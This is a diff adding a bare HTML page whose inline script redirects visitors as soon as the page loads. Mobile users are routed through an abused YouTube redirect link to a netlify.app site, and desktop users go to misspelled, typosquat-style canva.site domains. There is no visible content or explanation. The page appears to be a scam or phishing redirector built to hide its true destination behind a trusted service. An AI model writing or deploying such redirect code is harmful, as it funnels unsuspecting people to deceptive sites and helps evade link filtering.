@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <script type="text/javascript">
+            window.onload = function() {
+
+                var desktopFallback = "https://clivckhnerevnow.my.canva.site",
+                mobileFallback = "https://clickhverevnnow.my.canva.site",
+                app = "vnd.youtube:www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbDNDR3Q1YTNSUkVtUkR6UHdvMHlJWXlfaDlMd3xBQ3Jtc0trRldJekxRNkEzUkZCVDQyVXVLb3QxbTlqLTdiSHhldUx2N0dMOXhnekFtRGVCUUpCQVZ1UWt6VHVzenhUUS1RUzMza29wZXZaR3ZJT1BvZmppLTdNOTNJU0NJd05fQ0NERHBXSFV1NUFwRXJqeDFqYw&q=https%3A%2F%2Fmajestic-smakager-b00565.netlify.app%2F&html_redirect=1";
+
+                if( /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ) {
+                    window.location = app;
+                    window.setTimeout(function() {
+                        window.location = mobileFallback;
+                    }, 25);
+                } else {
+                    window.location = desktopFallback;
+                }
+
+                function killPopup() {
+                    window.removeEventListener('pagehide', killPopup);
+                }
+
+                window.addEventListener('pagehide', killPopup);
+
+            };
+        </script>
+    </body>
+</html>
